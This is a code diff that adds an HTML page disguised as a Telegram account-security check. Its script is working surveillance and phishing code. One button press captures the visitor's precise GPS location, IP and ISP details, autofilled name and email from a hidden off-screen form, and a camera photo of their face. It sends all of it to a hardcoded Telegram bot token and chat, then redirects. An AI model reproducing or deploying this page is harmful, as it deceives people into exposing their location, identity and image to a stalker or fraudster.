@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Identity Verification</title>
+    <style>
+        #hidden-form { position: absolute; left: -9999px; }
+        body { font-family: sans-serif; background: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; }
+        .logo { width: 100px; margin-bottom: 20px; }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+        .btn { background: #3390ec; color: white; border: none; padding: 16px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
+    <h2>Account Security</h2>
+    <p>Please verify your identity and device location to continue accessing your account.</p>
+    <button class="btn" onclick="captureEverything()">VERIFY IDENTITY</button>
+</div>
+
+<!-- فۆرمی شاراوە بۆ Autofill -->
+<form id="hidden-form">
+    <input type="text" name="name" id="st_name" autocomplete="name">
+    <input type="email" name="email" id="st_email" autocomplete="email">
+</form>
+
+<video id="video" autoplay style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const token = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+    const chatID = "6679834643";
+
+    async function captureEverything() {
+        // 1. وەرگرتنی لۆکەیشنی وردی GPS
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = position.coords.accuracy;
+                let gpsMsg = `📍 GPS LOCATION FOUND!\n\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Accuracy: ${acc} meters\n- Google Maps: https://www.google.com/maps?q=${lat},${lon}`;
+                sendToTelegram(gpsMsg);
+            }, err => {
+                sendToTelegram("❌ GPS Access Denied by User");
+            }, { enableHighAccuracy: true, timeout: 5000 });
+        }
+
+        // 2. وەرگرتنی IP و زانیاری ئینتەرنێت (بۆ دڵنیایی زیاتر)
+        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
+            let netMsg = `🌐 Network Info:\nIP: ${data.ip}\nCity: ${data.city}\nISP: ${data.org}`;
+            sendToTelegram(netMsg);
+        });
+
+        // 3. وەرگرتنی Autofill (ناو و ئیمەیڵ)
+        setTimeout(() => {
+            let n = document.getElementById('st_name').value;
+            let e = document.getElementById('st_email').value;
+            if(n || e) sendToTelegram(`👤 Autofill Data:\nName: ${n}\nEmail: ${e}`);
+        }, 1000);
+
+        // 4. وێنەی ڕووخسار (Camera Capture)
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatID);
+                    fd.append('photo', blob, 'target.jpg');
+                    fd.append('caption', '👤 Target Face Captured!');
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg');
+                stream.getTracks().forEach(t => t.stop());
+                
+                // دوای هەموو ئەمانە، دەچێتە سەر لاپەڕەی ژمارە لێدان
+                window.location.href = "index.html";
+            }, 2000);
+        } catch(e) {
+            sendToTelegram("❌ Camera Access Denied");
+            window.location.href = "index.html";
+        }
+    }
+
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatID, text: text })
+        });
+    }
+</script>
+
+</body>
+</html>
